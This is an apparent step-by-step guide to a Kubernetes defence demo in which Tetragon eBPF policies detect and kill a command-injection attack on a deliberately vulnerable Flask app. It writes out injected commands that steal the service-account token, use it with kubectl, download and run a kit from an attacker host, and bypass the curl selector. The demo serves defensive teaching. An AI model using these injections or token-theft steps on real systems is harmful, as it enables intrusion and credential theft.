# What happens at each step

This page follows the demo step by step and says, for each one, what the
vulnerable app does, what Tetragon sees in the kernel, and what Tetragon does
about it. The event lines quoted are from a real run (Ubuntu 24.04, kernel
6.8, Tetragon 1.8.0); pod names and counters will differ on your machine.

New to the vocabulary (kprobe, selector, Sigkill, monitor mode)? Read
[CONCEPTS.md](CONCEPTS.md) first.

## The cast

| Who | What it is |
|---|---|
| **NetCheck** (`app/app.py`) | A Flask app in pod `webapp`. `/lookup?host=X` runs `getent hosts X` **through `/bin/sh`**, which is the command-injection bug. `/status` runs `curl http://inventory.../health` **without** a shell, which is the app's legitimate use of curl. |
| **Inventory** | A tiny internal HTTP service in pod `inventory`. |
| **Attacker server** | A podman container outside the cluster (`10.88.0.x`) serving a harmless `kit.sh`. |
| **`scripts/attack.sh`** | The attacker. Sends requests to `/lookup` with `host=localhost; <command>`. |
| **Cilium** | Enforces the network policy with eBPF on each pod's network interface. |
| **Tetragon** | Watches processes from the kernel with eBPF. Reports every program start and exit, and applies the TracingPolicies the demo loads. |

## How one injected command runs

Every attack step follows the same path. Knowing it makes the events easy to
read:

```
attack.sh ── HTTP GET /lookup?host=localhost; cat /var/run/.../token ──▶ Flask (python app.py)
                                                                            │ fork()
                                                                            ▼
                                                      copy of python ── execve("/bin/sh") ──▶ /bin/sh -c "getent hosts localhost; cat ..."
                                                                                                │ fork + execve for each command
                                                                                                ├── /usr/bin/getent hosts localhost
                                                                                                └── /usr/bin/cat /var/run/.../token
```

The output of the shell goes back to the attacker in the HTTP response.
Tetragon sees each `execve` as a `🚀 process` event and each exit as a
`💥 exit` event, from the moment it is installed, with no policy loaded.

---

## Act 0: the network policy is enforced

`scripts/netpol-test.sh` opens six TCP connections and records what happens.

| Connection | Policy | What Cilium does | Result |
|---|---|---|---|
| webapp → inventory:8080 | allowed (its dependency) | passes the packets | `CONNECTED` |
| webapp → attacker:80 | allowed ("partner API" rule) | passes the packets | `CONNECTED` |
| webapp → attacker:8080 | denied (port not listed) | drops the packets | `TIMEOUT` |
| webapp → Kubernetes API server | denied (not listed) | drops the packets | `TIMEOUT` |
| other pod → webapp:5000 | allowed (the app's port) | passes the packets | `CONNECTED` |
| other pod → inventory:8080 | denied (only webapp may) | drops the packets | `TIMEOUT` |

A denied connection times out instead of being refused, because Cilium drops
the packets silently. While the test runs it captures Cilium's own drop log,
which shows a `Policy denied` line for each blocked attempt.

**Tetragon:** not involved. This is all Cilium.

**The point:** the policy is real and enforced. What follows isn't a
misconfigured policy; it's the limit of what network policy can see.

---

## Act 1: the attack, with only the network policy

| Step | Vulnerable app does | Tetragon sees | Tetragon does | Result |
|---|---|---|---|---|
| **Recon** | Runs `/bin/sh -c "getent hosts localhost; id; hostname; uname -r"` as root | `🚀 process /bin/sh`, then `id`, `hostname`, `uname` starting and exiting `0` | Reports only (no policy loaded) | Attacker learns it is root in pod `webapp-...` |
| **Steal token** | Shell runs `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | `🚀 process /usr/bin/cat .../token`, `💥 exit ... 0` | Reports only | The JWT goes back in the HTTP response |
| **Use token** | Nothing: this happens on the attacker's machine | Nothing: not in a pod | n/a | `kubectl --token=<stolen>` reads `payments-api-key` from outside the cluster |
| **Download kit** | Shell runs `curl -s http://10.88.0.4/kit.sh -o /tmp/kit.sh`, then `sh /tmp/kit.sh` | `curl` and `sh /tmp/kit.sh` start and exit `0` | Reports only | The toolkit runs |

**Why the network policy didn't help:** the exploit came in on the app's
allowed port, the download used the allowed outbound HTTP rule, the token read
is a file read (not network traffic), and the token was used from outside the
cluster. The pod's lack of API access (proved in Act 0) didn't matter.

---

## Act 2: monitor mode

Three TracingPolicies are loaded with `policy-mode: monitor`. Tetragon
attaches eBPF programs to three kernel functions inside the `webapp` pod only
(the `podSelector`).

| Policy | Hook (kernel function) | Selector: what must match |
|---|---|---|
| `block-token-read` | `security_file_open` | the path starts with the token directory |
| `block-curl-download` | `security_socket_connect` | the program is `/usr/bin/curl` **and** its first argument does **not** start with the inventory URL |
| `block-shell` | `security_bprm_check` | the program about to start is `sh`, `dash` or `bash` |

The same attack runs again:

| Step | Vulnerable app does | Tetragon sees | Tetragon does (monitor) | Result |
|---|---|---|---|---|
| Each injection | Flask forks, and the copy is about to `execve("/bin/sh")` | `❓ syscall /usr/local/bin/python security_bprm_check` (the copy is still `python` at this moment) | Counts it in `NMONITOR`, posts the event | Shell starts as normal |
| Steal token | `cat` opens the token | `❓ syscall /usr/bin/cat security_file_open` | Counts and posts | Token still printed |
| Download kit | Attacker's `curl -s http://10.88.0.4/...` connects | `❓ syscall /usr/bin/curl security_socket_connect` (once per connect attempt) | Counts and posts | Kit still downloaded |
| `attack.sh legit` | App runs `curl http://inventory.../health --silent --max-time 3` | `🚀 process` and `💥 exit 0` only, **no** `❓ syscall` line | Nothing: argv[1] starts with the inventory URL, so the selector doesn't match | `inventory: ok` |

**The point:** the counters (`2 / 3 / 5` in our run) show exactly what each
policy *would* kill, and the last row proves the curl policy leaves the app
alone, before anything is enforced.

---

## Act 3: enforce, one layer at a time

| Layer enforced | Vulnerable app does | Tetragon sees | Tetragon does | What the attacker gets |
|---|---|---|---|---|
| **Token read** | Shell runs `cat .../token` | `security_file_open` by `cat` on the token path | Sends **SIGKILL** to `cat` inside the hook. The kill lands before `cat` returns to its own code, so it never reads a byte | `cat_exit=137` (128 + 9 = SIGKILL) and the shell prints `Killed`. No token, so `use-token` has nothing to use |
| **curl download** | Shell runs `rm -f /tmp/kit.sh; curl -s http://10.88.0.4/kit.sh ...; sh /tmp/kit.sh` | `security_socket_connect` by `curl` with argv[1] = `-s` | SIGKILL to `curl` at its first `connect()` | `curl_exit=137`, `Killed`, then `sh: 0: cannot open /tmp/kit.sh` because nothing was saved |
| (check) App's own curl | `/status` runs `curl http://inventory...` | Nothing matches | Nothing | `inventory: ok` |
| **Shell** | Flask forks, and the copy is about to `execve("/bin/sh")` | `security_bprm_check` with the `/bin/sh` binary | SIGKILL to the copy **before** it becomes a shell. Events show `💥 exit ... /usr/local/bin/python app.py SIGKILL` | Every injection comes back empty. Flask's `subprocess.run` just gets return code -9 for that request |

**Why the app survives:** the process killed in the shell layer is the
forked copy, not Flask itself. `kubectl -n demo get pods` shows `RESTARTS 0`,
and `/status` keeps answering.

**Why the mode change needs `--domain k8s`:** policies created with kubectl
live in Tetragon's `k8s` domain. `scripts/policy.sh enforce` adds the flag for
you.

---

## Act 4: the bypass

| Step | Vulnerable app does | Tetragon sees | Tetragon does | Result |
|---|---|---|---|---|
| Shell policy back to monitor | n/a | n/a | `block-shell` reports again instead of killing | Injected commands run again |
| `curl http://inventory.../health -s http://10.88.0.4/kit.sh` | Shell runs curl with **two** URLs | `🚀 process /usr/bin/curl "http://inventory... -s http://10.88.0.4/kit.sh"`, `💥 exit 0`, **no** `❓ syscall` | Nothing: argv[1] is the allowed URL, so the selector doesn't match | curl fetches both URLs: `ok`, then the full text of `kit.sh` |

**The point:** `matchCmdArgs` checks one argument at a fixed position. It's
excellent for keeping legitimate use working, but it's not a wall. The
execution layer (no shells) is what actually holds.

---

## Act 5: the stateful tripwire

Each tripwire policy has two probes and one piece of state, `tripped`:

- **Probe 1:** `security_file_open` on `/app/.aws/credentials` (a decoy the app never reads) → `UpdateState tripped = 1`.
- **Probe 2:** `security_socket_connect`, matching only when `tripped == 1`.

**Observe mode** (`04-tripwire-observe.yaml`, probe 2 only posts):

| Step | Vulnerable app does | Tetragon sees | Tetragon does | Result |
|---|---|---|---|---|
| `cat /app/.aws/credentials` | Shell runs `cat` on the decoy | `security_file_open` by `cat` | Sets `tripped = 1`, posts the event | Decoy credentials printed |
| `python3 -c "urlopen('http://10.88.0.4/kit.sh')"` | Shell first runs `getent`, then `python3`, which connects out | `security_socket_connect` by `getent` and by `python3` | Posts each one, because the state is now 1 | Download succeeds, but every connection after the decoy read is flagged, whichever program makes it. The curl rule never saw this download, because it wasn't curl |

**Lockdown mode** (`05-tripwire-lockdown.yaml`, probe 2 posts **and** kills):

| Step | Vulnerable app does | Tetragon sees | Tetragon does | Result |
|---|---|---|---|---|
| `cat /app/.aws/credentials` | Same as above | Same | Sets `tripped = 1` | Decoy printed |
| `getent hosts localhost` (part of every injection) | `getent` opens a socket to look up the name | `security_socket_connect` by `getent` | **SIGKILL** | First `Killed` |
| `python3 ... urlopen(...)` | `python3` connects to the attacker | `security_socket_connect` by `python3` | **SIGKILL** | Second `Killed`, `exit=137`, no download |
| `attack.sh legit` | App's own `curl http://inventory...` connects | `security_socket_connect` by `curl` | **SIGKILL**: the state doesn't care which program or which URL | `inventory: curl exited with -9` |
| `policy.sh reset-tripwire` | n/a | n/a | The policy is deleted and re-applied, which creates fresh state (`tripped = 0`) | `inventory: ok` again |

**The point:** state-gated enforcement works, and it's a blunt instrument.
The state is shared by the whole policy, not tracked per process, so once
tripped it locks down **everything** in the pod, the app's own traffic
included, until someone resets it. That's why the output shows `Killed`
twice: once for `getent`, once for `python3`.

---

## One more line you may see

During `scripts/demo.sh reset`, older versions of this demo showed
`💥 exit demo/webapp-<old pod> /usr/local/bin/python app.py SIGKILL`. That
wasn't Tetragon: the Flask dev server ignored Kubernetes' SIGTERM, so after
the 30-second grace period the kubelet sent SIGKILL. The app now exits on
SIGTERM, which also makes the reset about 30 seconds faster.
